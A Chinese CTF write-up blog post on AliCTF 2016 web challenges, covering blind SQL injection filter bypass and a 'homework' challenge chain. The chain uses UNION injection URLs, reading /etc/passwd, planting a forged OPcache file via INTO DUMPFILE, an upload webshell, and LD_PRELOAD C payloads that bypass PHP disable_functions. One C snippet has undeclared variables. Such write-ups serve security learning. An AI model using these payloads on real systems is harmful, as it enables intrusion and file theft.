---
title: alictf2016_web_writeup
date: 2016-06-06 16:39:05
tags:
- Blogs
- ctf
- php
- opcache
- c
categories:
- Blogs
---
感觉时间总算是转了一年，去年也大概是alictf才开始能做出签到题目以外的题目，今年强撸了一波alictf，不得不说，又遇到蓝莲花+0ops出题，web真的难度很高，比较蛋疼的是homework，说实话是一道想法很好很好的题目，但是强行和asis有区别，写了实战情况不合的权限....不管怎么说还是学了很多东西，整理下wp...

![](/img/alictf2016/point.png)
<!--more-->

# find password

题目其实挺蛋疼的，本来是简单的登陆盲注，但是却写了很多奇怪的过滤，导致写脚本的时候各种出问题，花了很长时间改，不过用了以前的通用脚本还是感觉不错的，在sqlmap不能用的情况，还是可以用，结尾贴github链接

先说题目，在login的时候有一个check请求存在注入，可以优化成盲注，登陆一个不存在的账户是提示账号密码错误，登陆一个存在的账号时提示登陆成功。

还有一些过滤，基本都能绕，但是搞得我写脚本写的很恶心。。。

```
select count table table_schema from where or and 空格 # / columns  
```
而且是替换为空，所以直接tabtablele这样就好了。

[github脚本](https://github.com/LoRexxar/bsqlier)


# homework

题目很难，几乎算是最近撸得最难的题目了，但是踩了权限的坑，再加上出题人强行遭洞，导致很多问题都和本地差异很大，让我们来一点点儿说...

## 源码
```
detail.php
 <?php
include("conn.php");
if (!isset($_SESSION['username'])) {
    header("Location: login.php");
    exit();
}

$sql = "SELECT brief FROM homework WHERE id= '" . $_GET['id'] . "'";

$result = query($sql);
if($result){
    $result=$result[0];
}
?>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1.0">
  <title>Homework System</title>
  <link href="css/bootstrap.css" rel="stylesheet">
  <link rel="stylesheet" href="css/main.css">
</head>
<body>
 <div class="container">
    <fieldset>
    
    <div class="panel panel-success">
        <div class="panel-heading">
          <legend>
              Homework System
              <a href="logout.php" class="return">Sign Out </a>
              <br/>
          </legend>

        </div>
   </div>
 </fieldset>
    <fieldset>
        <div class="panel panel-info">
            <div class="panel-heading">
                <h3 class="panel-title"><legend>Your Homework</legend></h3>
            </div>
            <div class="panel-body">
                <?php
                if($result){
                    echo $result["brief"];
                }
                ?>
            </div>
        </div>
    </fieldset>
</div>


</script>
<script src="js/jquery-1.12.2.min.js"></script>
<script src="js/bootstrap.min.js"></script>
</body>
</html> 
```

```
 <?php
include("conn.php");
if(!isset($_POST["detail"]))
    die();


$detail=$_POST["detail"];
if(!preg_match("/^\w+$/",$detail))
    die("Only allow [\w+]!");
if(isset($_FILES['pic']['name'])&&$_FILES['pic']['name']!=="") {
    $picname = $_FILES['pic']['name'];
    if(!preg_match("/^[\w.]+$/",$picname))
        die("Filename only allow /^[\w.]+$/");
    
    $picsize = $_FILES['pic']['size'];
    if ($picname != "") {
        if ($picsize > 1024000) {
            die('Too big!');
        }
        
        $pics = date("YmdHis")."-".$picname;
        $pic_path = "upload/". $pics;
        
        if(stripos($picname,"ph")!==false||stripos($picname,"pht")!==false||stripos($picname,"php5")!==false||stripos($picname,"php4")!==false||stripos($picname,"php3")!==false)
            file_put_contents($pic_path,"bad man!");    
        else        
            move_uploaded_file($_FILES['pic']['tmp_name'], $pic_path);

        $sql = "INSERT INTO homework(username,brief) values('".$_SESSION['username']."','$detail')";
        query($sql);
        echo "Upload Success！Path:".$pic_path;
    }
    else
        die("Where is your homework?");    
}
else
    die("Where is your homework?");
    
function getRandChar($length){
   $str = null;
   $strPol = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
   $max = strlen($strPol)-1;

   for($i=0;$i<$length;$i++){
    $str.=$strPol[rand(0,$max)];
   }

   return $str;
} 
```

## 首先是上传页面存在注入（这里开始挖坑）

```
http://121.40.50.146/detail.php?id=124'+and+'1'='1

http://121.40.50.146/detail.php?id=124'+and+'1'='2
```

首先是发现注入点，测试过滤发现没有任何过滤，那就直接注吧

```
http://121.40.50.146/detail.php?id=-124'+union+select+user()%23

fire@localhost   
firecms
http://121.40.50.146/detail.php?id=-124'+UNION+SELECT+COUNT(*)+from+information_schema.tables+WHERE+table_schema+=+DATABASE()+limit+0,1%23

2

homework
user
   
http://121.40.50.146/detail.php?id=-124'+UNION+SELECT+COUNT(*)+from+information_schema.columns+WHERE+table_name+=+'homework'+limit+0,1%23
3
id
username
brief

http://121.40.50.146/detail.php?id=-124'+UNION+SELECT+count(*)+from+information_schema.columns+WHERE+table_name+=+'user'+limit+0,1%23
2
username
password

```
首先是注入没有任何收获，那么开始尝试读文件

```
http://121.40.50.146/detail.php?id=-124'+UNION+SELECT+load_file('/etc/passwd')%23

root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
libuuid:x:100:101::/var/lib/libuuid: 
syslog:x:101:104::/home/syslog:/bin/false 
messagebus:x:102:105::/var/run/dbus:/bin/false 
ntp:x:103:109::/home/ntp:/bin/false 
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
mysql:x:105:114:MySQL Server,,,:/nonexistent:/bin/false

/etc/hosts

127.0.0.1 localhost 127.0.1.1	localhost.localdomain	localhost # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.251.236.147 iZ23bb0g4vdZ    

/etc/group

root:x:0: daemon:x:1: bin:x:2: sys:x:3: adm:x:4:syslog tty:x:5: disk:x:6: lp:x:7: mail:x:8: news:x:9: uucp:x:10: man:x:12: proxy:x:13: kmem:x:15: dialout:x:20: fax:x:21: voice:x:22: cdrom:x:24: floppy:x:25: tape:x:26: sudo:x:27: audio:x:29: dip:x:30: www-data:x:33: backup:x:34: operator:x:37: list:x:38: irc:x:39: src:x:40: gnats:x:41: shadow:x:42: utmp:x:43: video:x:44: sasl:x:45: plugdev:x:46: staff:x:50: games:x:60: users:x:100: nogroup:x:65534: libuuid:x:101: netdev:x:102: crontab:x:103: syslog:x:104: messagebus:x:105: fuse:x:106: mlocate:x:107: ssh:x:108: ntp:x:109: stapdev:x:110: stapusr:x:111: stapsys:x:112: ssl-cert:x:113: mysql:x:114: 
```

测试发现可以写文件，但是只有mysql用户的权限（最开始其实没有意识到，后来踩坑才发现）

由于这个权限问题，所以mysql没有读任何除了755文件以外的文件，apache和php的配置文件都没有读到。

花了很长时间测试为什么读不到东西，曾经以为mysql在docker上....第二天随手扫目录发现新收获

## php opcache

扫目录发现了很重要的info.php和phpinfo.php文件，故名思意，一个是phpinfo().

info.php中是提示（题目关了忘记保存），大致意思是flag在根目录，disable_function ban了你能想到的大部分函数，你需要想别的办法。

查看phpinfo()，一眼发现php opcache开启，了然于心，开始测试。

由于前段时间还遇到一个这样的实战题目，所以开始一直很顺利
[曾经写的asis题目wp,里面就是这个洞](http://lorexxar.cn/2016/05/10/asis-bcloud/)

而且本地测试通过，但是却发现一个蛋疼的事情是opcache默认只有www的600,mysql实际上没有修改的权限(以至于中途题目挂了重启之后，过了一段时间出题人想起来了才修改了opcache权限....)

不管怎么样，**远程-本地=无穷**这个道理还是不变，测试发现能成功写入。

ps:中间遇到了一个很大的问题，也是踩了坑才弄明白， 一般来说，我们使用注入点写文件不会写一个webshell进去（因为权限），所以很少会用mysql写二进制这样的文件进去，后来发现intofile在使用的时候会把16进制的00这样的东西转为\0,然后就炸了，你需要使用dumpfile
```
http://121.40.50.146/detail.php?id=-124'+UNION+SELECT+0x4f504341434845003339623030356164373734323863343237383831343063363833396536323031d004000000000000000000000000000000000000000000000000000000000000751f2b0500000000a8010000000000000200000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0c0000005003000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000a80100000000000001000000040000000000000000000000ffffffff070000000002000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000700000012000000feffffff0000000000000000000000000000000000080000ffffffff0000000000000000e051840000000000010000000700000012000000feffffff0000000000000000000000000000000010000000ffffffff0000000000000000c04a84000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000d00400000000000000020000000000000000000000000000000000000000000000000000000000000000000067285100000000000000000004000000060600004c720f400838aed51e000000000000002f686f6d652f777777726f6f742f64656661756c742f64646f672e7068700000000000000000000000000000000000000000000000000000000000000000000070020000000000000600000000000000900200000000000006000000ffffffffc0020000000000000600000008000000e00200000000000006000000ffffffff080300000000000006000000ffffffff280300000000000006000000ffffffff010000000000000004000000ffffffff01000000060600006756a715530600800600000000000000707574656e7600000000000006060000d57bb4bed65a7ef917000000000000004c445f5052454c4f41443d2f746d702f64646f672e736f000100000006060000687f9a7c0100008004000000000000006d61696c000000000000000006060000afe020ba620f68c00b0000000000000061406c6f63616c686f737400000000000100000006060000051500000000008000000000000000000000000000000000000000000606000096db284491abf2ce0d000000000000004861636b2062792064646f672100000040958d000000000070000000000000000000000001000000020000003d080108309e89000000000010000000010000006000000002000000020000004101080880e189000000000000000000000000006000000000000000020000008108082440958d0000000000b0000000200000000000000005000000030000003d080108309e890000000000300000000100000060000000020000000300000041010808309e890000000000400000000200000070000000020000000300000041010808309e890000000000400000000300000080000000020000000300000041010808309e890000000000400000000400000090000000020000000300000041010808309e8900000000004000000005000000a000000002000000030000004101080880e189000000000000000000000000006000000000000000030000008108082430308a000000000050000000000000000000000000000000040000002801080870178e0000000000600000000000000000000000ffffffff040000003e010808+into+dumpfile+'/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/20160606000605-20140410104212706.php.bin'#
```

在成功写入只有，意识到disable_function的问题没有解决。

## 利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令

[文章原址](http://drops.wooyun.org/tips/16054)

当然还是那句话，本地测试perfect...远程血崩。

首先写个c代码

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h> 
 
void payload() {
        system("echo '233' > /tmp/test");
}   
 
int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
```

编译为.so
```
$ gcc -c -fPIC hack.c -o hack 
 
$ gcc -shared hack -o hack.so
```

然后编写php

```
<?php
putenv("LD_PRELOAD=/var/www/hack.so");
mail("a@localhost","","","","");
?>
```
都上传上去之后测试，果不其然失败了

这里就是权限的原因了，我用mysql传了.so，然后`echo '233' > /tmp/test`，而test是我用mysql新建的文件，这里权限不够写不进去，后来,换了全程php方法。

在upload下写入upload.php还有读文件的php
```
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="file" id="file" /> 
<br />
<input type="submit" name="submit" value="Submit" />
</form>
<?php
error_reporting(-1);
ini_set("display_errors", 1);
move_uploaded_file($_FILES['file']['tmp_name'],$_GET['a2']);
echo "Hack by ddog!";
?>
```
读文件用了这个
```
highlight_file(__FILE__)
```

重新测试之后发现几乎能想到的读文件和列目录方式都被ban了，没办法，那么用c语言进行列目录读文件...

```
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<dirent.h>

void payload() {
	FILE *fp;
	char buf[100];
	dir = opendir("/");
	fp = fopen("/tmp/ddog123", "w");
	fgets(buf, 100, fp2);
	fputs(buf, fp);
	while ((dp = readdir(dir)) != NULL) {
		fputs(dp->d_name, fp);
	}
	fclose(fp);
	closedir(dir);
}

int geteuid() {
	if (getenv("LD_PRELOAD") == NULL) {
		return 0;
	}
	unsetenv("LD_PRELOAD");
	payload();
}

```
![](/img/alictf2016/flag.png)